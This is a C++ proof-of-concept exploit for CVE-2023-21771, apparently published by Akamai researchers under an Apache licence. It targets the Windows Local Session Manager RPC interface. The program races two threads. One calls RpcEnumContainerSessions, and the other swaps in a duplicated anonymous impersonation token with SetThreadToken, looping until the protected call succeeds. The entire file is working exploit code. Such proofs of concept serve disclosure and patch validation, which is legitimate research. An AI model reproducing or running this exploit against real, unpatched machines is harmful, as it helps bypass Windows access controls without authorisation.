/* CVE-2023-21771 PoC code
 * Copyright 2023 Akamai Technologies, Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in
 * compliance with the License.  You may obtain a copy
 * of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in
 * writing, software distributed under the License is
 * distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR
 * CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing
 * permissions and limitations under the License.
 */

#include <iostream>
#include <thread>
#include "lsm_h.h"

#pragma comment(lib, "RpcRT4.lib")
bool exploited = false;

void call_enum()
{
    RPC_STATUS rpcStatus;
    handle_t hExplicitBinding = NULL;
    RPC_WSTR szStringBinding = NULL;
    RPC_WSTR pszProtSeq;
    RPC_WSTR pszHost;
    RPC_WSTR pszPort;

    pszProtSeq = (RPC_WSTR)L"ncalrpc";
    pszPort = (RPC_WSTR)L"\\RPC Control\\LSMApi";
    pszHost = (RPC_WSTR)L"";
    RPC_WSTR pszHostSPN = (RPC_WSTR)L"NT AUTHORITY\\SYSTEM";

    rpcStatus = RpcStringBindingComposeW(0, pszProtSeq, pszHost, pszPort, NULL, &szStringBinding);

    if (rpcStatus != RPC_S_OK) {
        wprintf(L"[-] Failed with status: %d.\n", rpcStatus);
        return;
    }


    rpcStatus = RpcBindingFromStringBinding(szStringBinding, &hExplicitBinding);
    if (rpcStatus != RPC_S_OK) {
        wprintf(L"[-] Failed creating binding with status: %d.\n", rpcStatus);
        return;
    }

    RPC_SECURITY_QOS secQos;
    secQos.Version = RPC_C_SECURITY_QOS_VERSION_1;
    secQos.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
    secQos.IdentityTracking = RPC_C_QOS_IDENTITY_DYNAMIC;
    secQos.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
    
    rpcStatus = RpcBindingSetAuthInfoEx(
        hExplicitBinding,
        pszHostSPN,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_AUTHN_WINNT,
        NULL,
        RPC_C_AUTHZ_NAME,
        &secQos
    );

    if (rpcStatus != RPC_S_OK) {
        wprintf(L"[-] RpcBindingSetAuthInfoEx() failed with status: %d.\n", rpcStatus);
        exit(rpcStatus);
    }

    long numberOfContainers = 0;
    _CONTAINERINFO* containersInfo = nullptr;

    // Sleep is used as some kind of sync mechanism. Could be better with barriers but I was lazy
    Sleep(1);

    RpcTryExcept{
    long result = RpcEnumContainerSessions(hExplicitBinding, &containersInfo, &numberOfContainers);
    wprintf(L"RpcEnumContainerSessions returned: %d\n", result);
    if (result == 0)
    {
        wprintf(L"Nubmer of running containers: %d\n", numberOfContainers);
        exploited = true;
    }
    }
        RpcExcept(1)
    {
        wprintf(L"Runtime reported exception: %u.\n", RpcExceptionCode());
    }RpcEndExcept
}

void change_token(HANDLE thread_handle, HANDLE new_access_token)
{
    // Sleep is used a some kind of sync mechanism. Could be better with events but I was lazy
    Sleep(1);

    long result = SetThreadToken(&thread_handle, new_access_token);
    //wprintf(L"SetThreadToken: %d\n", result);
}

int main()
{
    HANDLE access_token;
    HANDLE new_access_token;

    wprintf(L"Going to call RpcEnumContainerSessions without vuln\n");
    call_enum();
    wprintf(L"Now going to try to call RpcEnumContainerSessions with the vuln.\n");


    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &access_token))
    {
        wprintf(L"Error Opening process token\n");
        return -1;
    }
    if (!DuplicateTokenEx(access_token, TOKEN_IMPERSONATE, nullptr, SecurityAnonymous, TokenImpersonation, &new_access_token))
    {
        wprintf(L"Error duplicating token\n");
        return -1;
    }

    while (!exploited)
    {
        std::thread t1 = std::thread(call_enum);
        std::thread t2 = std::thread(change_token, t1.native_handle(), new_access_token);
        t1.join();
        t2.join();
    }
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
    return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
    free(p);
}